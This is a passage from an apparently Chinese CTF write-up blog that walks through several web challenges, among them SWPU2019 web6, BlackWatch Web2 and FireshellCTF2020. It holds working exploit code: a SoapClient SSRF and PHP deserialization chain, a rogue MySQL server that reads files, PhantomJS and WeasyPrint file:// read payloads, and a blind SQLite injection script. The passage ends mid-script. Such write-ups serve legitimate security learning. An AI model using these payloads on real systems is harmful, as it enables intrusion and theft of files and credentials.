class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ord(substr($data, $i, <span class="number">1</span>)) &lt; ord(substr($char, $i, <span class="number">1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            $str .= chr((ord(substr($data, $i, <span class="number">1</span>)) + <span class="number">256</span>) - ord(substr($char, $i, <span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $str .= chr(ord(substr($data, $i, <span class="number">1</span>)) - ord(substr($char, $i, <span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> decrypt(<span class="string">"3J6Roahxaw=="</span>,<span class="string">"flag&#123;this_is_false_flag&#125;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">xiaoC:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>知道了格式就可以通过给出的加密脚本和密钥构造admin:1，替换cookie以admin的身份登录了</p><p>后面的内容跟着wp做的，太菜了想不到</p><p>先写一个文件上传的网页</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://4895333f-5107-4410-aff4-4f630ea27904.node3.buuoj.cn/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后先生成一个SoapClient</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/interface.php'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: user=xZmdm9NxaQ=='</span>,</span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span> =&gt; <span class="string">"ha1c9on"</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕后上传文件，抓包进行修改，这里要注意带上PHPSESSID</p><img src="/2020/07/14/SWPU2019web6/6.png" class=""><p>然后就是要传入序列化的数据，给出exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> $mod3;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $flag;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> bb();</span><br><span class="line">$a = <span class="keyword">new</span> aa();</span><br><span class="line">$b-&gt;mod1 = $a;</span><br><span class="line">$c = <span class="keyword">new</span> cc();</span><br><span class="line">$a-&gt;mod2[<span class="string">'test2'</span>] = $c;</span><br><span class="line">$e = <span class="keyword">new</span> ee();</span><br><span class="line">$c-&gt;mod1 = $e;</span><br><span class="line">$d = <span class="keyword">new</span> dd();</span><br><span class="line">$e-&gt;str1 = $d;</span><br><span class="line">$e-&gt;str2 = <span class="string">'getflag'</span>;</span><br><span class="line">$d-&gt;flag = <span class="string">'Get_flag'</span>;</span><br><span class="line">$d-&gt;b = <span class="string">'call_user_func'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br></pre></td></tr></table></figure><p>访问se.php页面，把数据传给aa，带上PHPSESSID</p><img src="/2020/07/14/SWPU2019web6/7.png" class=""><p>相关知识链接：</p><p><a href="https://blog.csdn.net/ljl890705/article/details/79142383" target="_blank" rel="noopener">https://blog.csdn.net/ljl890705/article/details/79142383</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/100569464" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/100569464</a></p><p><a href="https://xz.aliyun.com/t/3339" target="_blank" rel="noopener">https://xz.aliyun.com/t/3339</a></p><p><a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/202819.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> SWPU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlackWatch入群题Web2</title>
      <link href="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/"/>
      <url>/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/</url>
      
        <content type="html"><![CDATA[<p>开题是这样的一个登录界面<a id="more"></a></p><img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/1.png" class=""><p>登录页面过滤了|’|or|and|#|等，注册界面好像没有过滤，这里可以抓包进行注册和登录</p><p>猜测查询语句为：select xx from xx where username=’$username’ and password=’$password’ xxx;通过反斜杠转义单引号使得后面得password语句能够逃逸成功</p><img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/2.png" class=""><p>注册成功，然后登录得时候要用到没接触过的知识点with rollup，具体作用可以去搜索一下看看有什么不一样的，我的理解是查到的数据会更多，即使某一列条件的值可能是NULL</p><img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/3.png" class=""><p>登录成功，放包，成功登录到了后台</p><img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/4.png" class=""><p>到这里思路卡住了，只知道flag和入群密码在根目录下面，题目提示了要用到内网靶机，应该要反弹shell，可是这里啥信息都没有，先来看看已经有得马，抓个包</p><img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/5.png" class=""><p>看到数据以json形式返回，返回得是文件名，到这里猜测可能可以进行目录穿越，点应该在name这，自己写一个传上去，发现都会带上Webshell，应该是自动拼接的，用%00截断</p><p>网页添加个分类，类名为穿越路径</p><img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/7.png" class=""><p>再抓包，可以看到flag和密码文件</p><img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/6.png" class=""><p>这里又出现了新问题，怎么读取文件内容，这题的考题还有sql注入，google，发现了sql伪服务器的脚本，那可能可以用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#mysql_server.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/etc/passwd"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/shuteer_xu/article/details/104046895/，这篇文章进行了相关知识点的讲解，很详细，虽然用的工具有点区别，文章里的是github上集成的工具" target="_blank" rel="noopener">https://blog.csdn.net/shuteer_xu/article/details/104046895/，这篇文章进行了相关知识点的讲解，很详细，虽然用的工具有点区别，文章里的是github上集成的工具</a></p><p>在内网靶机上启动sql服务之后，网址数据备份页面输入地址和端口点击连接测试就会有数据弹回</p><img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/8.png" class=""><p>这里不重复操作了，靶机返回的数据带出了flag和入群密码</p><img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/9.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> blackwatch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FireshellCTF2020</title>
      <link href="/2020/07/13/FireshellCTF2020/"/>
      <url>/2020/07/13/FireshellCTF2020/</url>
      
        <content type="html"><![CDATA[<h3 id="Caas"><a href="#Caas" class="headerlink" title="Caas"></a>Caas<a id="more"></a></h3><img src="/2020/07/13/FireshellCTF2020/1.png" class=""><p>打开是个c/c++的编译器，写了一段打印helloworld的代码，好像没有错误就会下载包含这段代码的文件，但是对做这道题没啥帮助</p><p>扫了目录啥都没有，抓包也没有有用的信息</p><p>这时看到了c语言的头文件，printf需要头文件才能够使用，这里的include能不能直接包含flag呢，先试一下只有#include&lt;stdio.h&gt;,报错了</p><img src="/2020/07/13/FireshellCTF2020/2.png" class=""><p>也许可以用报错的形式包含flag文件把flag带出来，试试#include&lt;/flag&gt;</p><p>不行，可能不用尖括号包裹，应该要用引号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include"/flag"</span></span><br></pre></td></tr></table></figure><img src="/2020/07/13/FireshellCTF2020/3.png" class=""><p>拿到flag，这里要注意要用双引号包裹，单引号行不通</p><h3 id="ScreenShooter"><a href="#ScreenShooter" class="headerlink" title="ScreenShooter"></a>ScreenShooter</h3><p>输入url，得到反馈信息的图片</p><p>刚开始忘记了buu不通外网，用自己的vps打了两个小时打不通，自闭了都。。。</p><p>后来想起来了，那就继续吧</p><p>用requestbin来看一下请求,看到了PhantomJS/2.1.1</p><img src="/2020/07/13/FireshellCTF2020/5.png" class=""><p><a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/" target="_blank" rel="noopener">https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/</a></p><p>这篇文章对于这道题的洞讲解的很详细，就是通过<code>file://</code>加载的文件被认为是符合Same Origin Policy的同源文件</p><p>buu上开个内网靶机，用上文章里的payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="actionscript"> x=<span class="keyword">new</span> XMLHttpRequest; </span></span><br><span class="line"><span class="actionscript"> x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText) </span></span><br><span class="line"> &#125;; </span><br><span class="line"><span class="actionscript"> x.open(<span class="string">"GET"</span>,<span class="string">"file:///etc/passwd"</span>); </span></span><br><span class="line"> x.send(); </span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问一下地址</p><img src="/2020/07/13/FireshellCTF2020/4.png" class=""><h3 id="URL-TO-PDF"><a href="#URL-TO-PDF" class="headerlink" title="URL TO PDF"></a>URL TO PDF</h3><p>访问url会形成pdf文件并且下载</p><p>用requestbin来看一下请求</p><img src="/2020/07/13/FireshellCTF2020/6.png" class=""><p>发现使用了WeasyPrint，查一下资料有关WeasyPrint的说明</p><ul><li>Only fetched images</li><li>No JavaScript</li><li>No&lt;iframe&gt;</li><li>we can use:&lt;img&gt; &lt;embed&gt; &lt;object&gt; &lt;link&gt;</li></ul><p>根据Ying师傅的wp，问题在&lt;link&gt;标签，在标签内href加载file://`实现SSRF+任意文件读取</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"uft-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"attachment"</span> <span class="attr">href</span>=<span class="string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问，将下载来的pdf文件放入kali里，kali自带了pdfdetach工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pdfdetach -list 1.pdf</span><br><span class="line">pdfdetach -save 1 1.pdf</span><br></pre></td></tr></table></figure><img src="/2020/07/13/FireshellCTF2020/7.png" class=""><h2 id="Cars"><a href="#Cars" class="headerlink" title="Cars"></a>Cars</h2><p>题目给了apk.zip文件，之前也没碰到过这种文件，说实话不会，瞎找找了下里面的文件，倒是真的找到了点东西，有get和post方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.arconsultoria.cars.rest</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.arconsultoria.cars.domain.Car</span><br><span class="line"><span class="keyword">import</span> com.arconsultoria.cars.domain.Comment</span><br><span class="line"><span class="keyword">import</span> com.arconsultoria.cars.domain.CommentResponse</span><br><span class="line"><span class="keyword">import</span> retrofit2.Call</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.Body</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.GET</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.POST</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.Path</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Rest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GET</span>(<span class="string">"/cars"</span>)</span><br><span class="line">    <span class="function">fun <span class="title">getCars</span><span class="params">()</span>: Call&lt;List&lt;Car&gt;&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    @<span class="title">GET</span><span class="params">(<span class="string">"/car/&#123;id&#125;"</span>)</span></span></span><br><span class="line"><span class="function">    fun <span class="title">getCar</span><span class="params">(@Path(<span class="string">"id"</span>)</span> id: Int): Call&lt;Car&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    @<span class="title">POST</span><span class="params">(<span class="string">"/comment"</span>)</span></span></span><br><span class="line"><span class="function">    fun <span class="title">postComment</span><span class="params">(@Body comment: Comment)</span>: Call&lt;CommentResponse&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p>分别进行访问，看看返回的数据</p><img src="/2020/07/13/FireshellCTF2020/8.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;cars返回的是ID和有关信息</span><br><span class="line">&#x2F;car&#x2F;id 返回的是单个id的数据信息</span><br><span class="line">&#x2F;comment post传值的路径</span><br></pre></td></tr></table></figure><p>接下来找一下有comment的文件</p><img src="/2020/07/13/FireshellCTF2020/9.png" class=""><p>获得了两个参数，name和message</p><img src="/2020/07/13/FireshellCTF2020/10.png" class=""><p>可以看到返回的数据是json的形式，尝试把数据改为json</p><img src="/2020/07/13/FireshellCTF2020/11.png" class=""><p>然后改成xml的数据形式</p><img src="/2020/07/13/FireshellCTF2020/12.png" class=""><p>成功，那用xml没跑了</p><img src="/2020/07/13/FireshellCTF2020/13.png" class=""><p>可以看到成功读到了/etc/passwd,接下来直接读flag</p><img src="/2020/07/13/FireshellCTF2020/14.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> outboard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vacation2</title>
      <link href="/2020/07/11/vacation2/"/>
      <url>/2020/07/11/vacation2/</url>
      
        <content type="html"><![CDATA[<h3 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id<a id="more"></a></h3><p>perlparam()任意文件读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ($cgi-&gt;upload(&#39;file&#39;)) &#123;</span><br><span class="line">    my $file &#x3D; $cgi-&gt;param(&#39;file&#39;);</span><br><span class="line">    while (&lt;$file&gt;) &#123;</span><br><span class="line">        print &quot;$_&quot;;</span><br><span class="line">        print &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。</span><br></pre></td></tr></table></figure><img src="/2020/07/11/vacation2/1.png" class=""><h3 id="BSidesCF-2019-Sequel"><a href="#BSidesCF-2019-Sequel" class="headerlink" title="[BSidesCF 2019]Sequel"></a>[BSidesCF 2019]Sequel</h3><p>打开是登录框，尝试注入报错只能输入字母或数字，应该是弱密码爆破了</p><img src="/2020/07/11/vacation2/2.png" class=""><p>爆出账号和密码都是guest，登录，cookie发生了改变，解码看看</p><img src="/2020/07/11/vacation2/3.png" class=""><p>json形式记录的信息，网页提示admin才能够看到信息，那应该就是要注出admin的账号信息了，开始以为是sql注入，后来怎么都不行，去看了wp，才知道是sqlite注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">out = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> string.printable:</span><br><span class="line">        tmp = out + letter</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> letter == <span class="string">'g'</span>: <span class="keyword">continue</span></span><br><span class="line">        payload2 = <span class="string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span>.format(tmp + <span class="string">'%'</span>)</span><br><span class="line">        payload1 = <span class="string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT password FROM userinfo WHERE password LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span>.format(tmp + <span class="string">'%'</span>)</span><br><span class="line">        payload3 = <span class="string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT username FROM userinfo WHERE username LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span>.format(tmp + <span class="string">'%'</span>)</span><br><span class="line"></span><br><span class="line">        payload1 = base64.b64encode(payload1.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        payload2 = base64.b64encode(payload2.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        payload3 = base64.b64encode(payload3.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        r = requests.get(<span class="string">'http://7e95f711-c309-4bfa-b522-a0be0d9d6b06.node3.buuoj.cn/sequels'</span>, cookies=&#123;<span class="string">"1337_AUTH"</span> : payload1&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Movie"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            out = tmp</span><br><span class="line">            sys.stdout.write(letter)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>payload2注出表名是userinfo,payload1和payload3分别能够注出密码和用户名，登录就能拿到flag</p><h3 id="NPUCTF2020-web🐕"><a href="#NPUCTF2020-web🐕" class="headerlink" title="[NPUCTF2020]web🐕"></a>[NPUCTF2020]web🐕</h3><p>对于webcrypto真的是一点办法都没有，密码学太难了23333</p><p>这个wp写的挺好的，<a href="http://wh1sper.cn/padding-oracle-attackcbc字节翻转攻击/" target="_blank" rel="noopener">http://wh1sper.cn/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a></p><p>详细的就不说了，贴一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 